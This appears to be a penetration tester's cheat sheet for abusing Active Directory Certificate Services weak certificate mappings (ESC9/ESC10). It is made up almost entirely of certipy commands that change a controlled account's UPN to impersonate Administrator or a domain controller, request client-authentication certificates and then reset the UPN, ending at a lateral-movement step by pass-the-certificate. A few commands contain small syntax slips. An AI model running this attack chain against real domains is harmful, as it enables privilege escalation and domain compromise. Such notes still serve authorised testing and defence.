# No Security Extension \ Weak Certificate Mappings - ESC9\ESC10

## Enumeration

 - certipy shadow auto -username ACCOUNT1@DOMAIN -p PASS1 -account ACCOUNT2 (Blind Test)

## Exploitation

#### 1) Case 1

 - certipy account update -username ACCOUNT1@DOMAIN -password PASS1 -userACCOUNT2 -upn Administrator

 - certipy req -username ACCOUNT2@DOMAIN -hashes HASH2 -ca CA_NAME -template VULNERABLE_TEMPLATE (ESC9)

## OR

 - certipy req -username ACCOUNT2@DOMAIN hashes HASH2 -ca CA_NAME -template ANY_TEMPLATE_WITH_CLIENT_AUTH

#### 2) Case 2

 - certipy account update -username ACCOUNT1@DOMAIN -password PASS1 -user ACCOUNT2 -upn 'DC_NAME$@DOMAIN'

 - certipy req -username ACCOUNT2@DOMAIN hashes HASH2 -ca CA_NAME -template ANY_TEMPLATE_WITH_CLIENT_AUTH

# Reset ACCOUNT2 UPN (This applies to both cases from now on)

 - certipy account update -username ACCOUNT1@DOMAIN -password PASS1 -user ACCOUNT2 -upn ACCOUNT2@DOMAIN

## Kerberos Mapping (Case 1) and Schannel Mapping (Case 2)

### Now we move laterally with Pass the Certificate
